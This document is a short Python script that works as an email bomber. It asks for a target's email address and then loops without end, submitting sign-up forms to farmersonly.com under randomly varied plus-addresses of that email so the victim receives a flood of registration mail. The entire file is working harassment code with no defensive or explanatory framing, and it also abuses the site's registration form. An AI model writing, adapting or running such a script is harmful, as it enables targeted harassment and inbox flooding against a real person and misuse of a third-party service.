import requests
import random
import os
import ctypes
zipc = '29671' 
count = 1
os.system('mode con: cols=75 lines=20')
ctypes.windll.kernel32.SetConsoleTitleW('farmersonly.com')
email = input('\n\t> email: ')
def spoof():
	global num, age, spoofed_email
	age = str(random.randint(18,50))
	a_string = str(email)
	partitioned_string = a_string.partition('@')
	num = '{}{}{}'.format('+', random.randint(1000000000000,99999999999999999), partitioned_string[1])
	email_username = partitioned_string[0]
	domain = partitioned_string[2]
	spoofed_email = '{}{}{}'.format(email_username, num, domain)
def send_email():
	global count
	spoof()
	payload = {
		'registration[minAge]': '18',
		'registration[maxAge]': '99',
		'registration[email]': spoofed_email,
		'registration[zipcode]': zipc,
		'registration[genders]': 'MF',
		'registration[age]': age,
		'registration[acceptTerms]': '0',
		'registration[acceptTerms]': '1',
		'x': '221',
		'y': '44'
		}
	requests.post('https://www.farmersonly.com/', data=payload)
	os.system('cls')
	print('\n\t> sent {} emails'.format(count))
	count += 1
	ctypes.windll.kernel32.SetConsoleTitleW('sent {} emails to {}'.format(count, email))
while True:
 send_email()
